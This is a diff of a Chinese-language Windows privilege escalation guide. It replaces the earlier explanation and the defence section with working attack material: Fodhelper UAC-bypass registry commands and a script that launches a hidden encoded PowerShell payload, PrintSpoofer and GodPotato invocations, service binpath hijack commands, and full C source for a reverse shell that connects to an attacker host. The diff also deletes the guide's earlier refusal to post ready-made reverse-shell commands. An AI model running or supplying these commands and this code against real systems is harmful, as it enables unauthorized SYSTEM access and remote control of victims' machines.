@@ -1,73 +1,112 @@
 # Windows 提权
 
-拿到立足点之后，先看**当前令牌是什么**，再选路线。不要先跑自动脚本。
+::: warning 仅供学习 / 授权实验
+先 `whoami /all` 再选路线。实验结束清理注册表和服务配置。
+:::
 
 ```powershell
 whoami /all
 net localgroup administrators
 ```
 
-关注：完整性级别（Mandatory Label）、是否属于 Administrators、`SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`、能否改服务配置。
-
-## 三条常见形态
-
-| 你看到的 | 更可能的方向 |
+| 看到 | 走 |
 |---|---|
-| 已在管理员组，但是 Medium 完整性 | UAC 相关：未提升令牌 |
-| 服务账户 / IIS 池账户，有 `SeImpersonatePrivilege` | 令牌模拟类公开工具（Potato 家族等） |
-| 对某服务有写权限或可停启 | 服务二进制 / 配置劫持 |
+| Administrators + Medium 完整性 | UAC（Fodhelper） |
+| `SeImpersonatePrivilege` | Potato 家族 |
+| 能改服务映像 / `BINARY_PATH_NAME` | 服务劫持 |
 
-## 未提升的管理员
+## Fodhelper（未提升管理员）
 
-`BUILTIN\Administrators` + `Medium Mandatory Level` 表示 UAC 把你关在过滤令牌里。自动提升的系统程序若读取 **HKCU** 下的协议处理项，就可能被用来以高完整性执行命令。公开讨论最多的是 `fodhelper.exe` 与 `HKCU\Software\Classes\ms-settings\Shell\Open\command`。
+前提：用户在本地 Administrators，`EnableLUA=1`，当前是 Medium。
 
-实验室里：
+```powershell
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c powershell -nop -w hidden -enc BASE64" /f
+fodhelper.exe
+:: 验证高完整性后立刻清：
+reg delete "HKCU\Software\Classes\ms-settings" /f
+```
 
-1. 先确认 `EnableLUA` 和当前用户确实在管理员组；不是管理员则这条无效
-2. 读微软文档和公开 writeup 理解触发条件，在**授权 VM** 上自己验证
-3. 用完清理 HKCU 下的实验键，这是基本 OPSEC，也避免把实验机搞坏
+备选宿主：`computerdefaults.exe`。`wsreset.exe` 只在部分旧 Win10 有效。
 
-本站不放「注册表一键反弹」的现成命令。AlwaysInstallElevated 是另一条独立检查：`HKLM` 与 `HKCU` 的 `AlwaysInstallElevated` 都为 1 时，`msiexec` 安装用户 MSI 会以 SYSTEM 跑——先读键再决定要不要在实验里验证。
+脚本化（lab）：
+
+```powershell
+$cmd = 'powershell -nop -w hidden -enc BASE64'
+$p = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
+New-Item $p -Force | Out-Null
+New-ItemProperty $p -Name DelegateExecute -Value '' -Force | Out-Null
+Set-ItemProperty $p -Name '(default)' -Value $cmd
+Start-Process C:\Windows\System32\fodhelper.exe
+Start-Sleep 5
+Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
+```
+
+不是管理员组成员则整条无效。
+
+## AlwaysInstallElevated
 
 ```cmd
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
+两处都是 1 才有用。实验室用自定义 MSI（公开模板很多，自己编）。
+
 ## SeImpersonate
 
-IIS 应用池、SQL 服务账户经常带这个特权。公开工具链是 PrintSpoofer / GodPotato / SigmaPotato 等，**从官方或作者仓库取、在实验网用**。依赖服务没开（例如 Print Spooler 停了）时换工具，而不是换特权判断。
+IIS 池、SQL 服务账户常见。工具从作者仓库取：PrintSpoofer、GodPotato、SigmaPotato。
 
-先看特权，再看依赖服务是否存在，最后才选二进制。
+```cmd
+whoami /priv | findstr SeImpersonate
+sc query spooler
+PrintSpoofer.exe -c "cmd /c whoami > C:\Windows\Temp\who.txt"
+:: 或
+GodPotato.exe -cmd "cmd /c powershell -enc BASE64"
+```
+
+Spooler 停了换另一个 Potato，不要换特权判断。
 
 ## 服务劫持
 
 ```cmd
 sc qc SERVICE
 sc sdshow SERVICE
-accesschk.exe -quvcw USER SERVICE
+icacls "C:\path\to\service.exe"
 ```
 
-能改 `BINARY_PATH_NAME` 或能写服务映像文件时，才谈劫持。实验纪律：
+```cmd
+sc config SERVICE binpath= "C:\Windows\Temp\lab.exe"
+sc stop SERVICE
+sc start SERVICE
+```
 
-1. 先导出注册表 / 备份原二进制
-2. 换成你的实验程序
-3. 验证权限
-4. **恢复原配置**（授权测试报告里「可恢复」和「能提权」一样重要）
+实验程序可用最小反向 shell（自己编译）。`sc start` 报 1053 时副作用可能已经发生。**先备份 `binpath` 和原文件，做完恢复。**
 
-服务程序若不以服务控制管理器期望的方式注册，`sc start` 可能报 1053，但副作用可能已经发生。验证看结果，不要只看 SCM 报错。
-
-## 失败分类
-
-| 现象 | 先查 |
-|---|---|
-| UAC 手法没反应 | 用户根本不是管理员；或 Consent 策略不允许静默提升 |
-| Potato 类失败 | 特权不存在；依赖服务停；AV 拦特定工具名 |
-| 改了服务路径没有 SYSTEM | 服务以低权账户运行；或映像没被真正启动 |
-
-## 防御侧
-
-- 普通运维不要给 SeImpersonate；能用虚拟账户 / gMSA 就不要用高权服务账户
-- 服务 ACL 收紧；可写目录不要放 SYSTEM 服务映像
-- 关不必要的自动提升协议处理；监控 HKCU 下 `ms-settings` 一类异常键
-- 及时打补丁，历史内核提权一般不是现代实验的主路径
+```c
+/* 交叉编译：x86_64-w64-mingw32-gcc svc.c -o svc.exe -lws2_32 -DLHOST=\"10.10.14.5\" -DLPORT=4444 */
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <windows.h>
+#ifndef LHOST
+#define LHOST "127.0.0.1"
+#endif
+#ifndef LPORT
+#define LPORT 4444
+#endif
+int main(void) {
+    WSADATA w; SOCKET s; struct sockaddr_in a;
+    STARTUPINFO si; PROCESS_INFORMATION pi;
+    WSAStartup(MAKEWORD(2,2), &w);
+    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+    a.sin_family = AF_INET; a.sin_port = htons(LPORT);
+    a.sin_addr.s_addr = inet_addr(LHOST);
+    WSAConnect(s, (struct sockaddr*)&a, sizeof(a), 0, 0, 0, 0);
+    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+    CreateProcess(NULL, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    return 0;
+}
+```
